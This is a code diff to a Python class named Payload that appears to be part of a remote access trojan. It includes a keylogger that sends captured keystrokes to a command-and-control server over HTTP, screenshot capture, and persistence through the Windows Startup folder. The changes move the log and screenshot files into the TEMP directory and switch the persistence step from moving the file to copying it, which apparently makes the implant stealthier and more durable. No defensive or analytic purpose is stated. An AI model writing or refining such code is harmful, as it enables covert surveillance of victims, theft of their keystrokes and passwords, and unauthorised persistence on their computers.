@@ -122,7 +122,7 @@ class Payload():
                 pass
             
     def keylogger(self, mode=None):
-        file = "./log.txt"
+        file = os.path.join(os.getenv('TEMP'), 'log.txt')
         
         def on_press(key):
             with open(file, 'a') as f:
@@ -168,9 +168,9 @@ class Payload():
             if 'keylogger' not in self.handlers:
                 try:
                     with open(file, 'r') as f:
-                        log = f.read()
+                        _log = f.read()
                     os.remove(file)
-                    data = {'data': str(log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
+                    data = {'data': str(_log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
                     requests.post(f'http://{self.c2[0]}:5000/api/file/add', data=data)
                     return 'Keystroke log upload complete'
                 except:
@@ -180,7 +180,7 @@ class Payload():
            
            
     def screenshot(self):
-        file = "./screen.png"
+        file = os.path.join(os.getenv('TEMP'), 'screenshot.png')
         
         try:
             screenshot = pyautogui.screenshot()
@@ -204,8 +204,8 @@ class Payload():
             script_path = f"./{script_name}"
             startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
             if not os.path.exists(os.path.join(startup_folder, script_name)):
-                shutil.move(script_path, startup_folder)
-                log(f"File moved from {script_path} to {startup_folder}")
+                shutil.copy(script_path, startup_folder)
+                log(f"Payload copied from {script_path} to {startup_folder}")
         except Exception as e:
             log(f"Error: {e}", level='error')
         
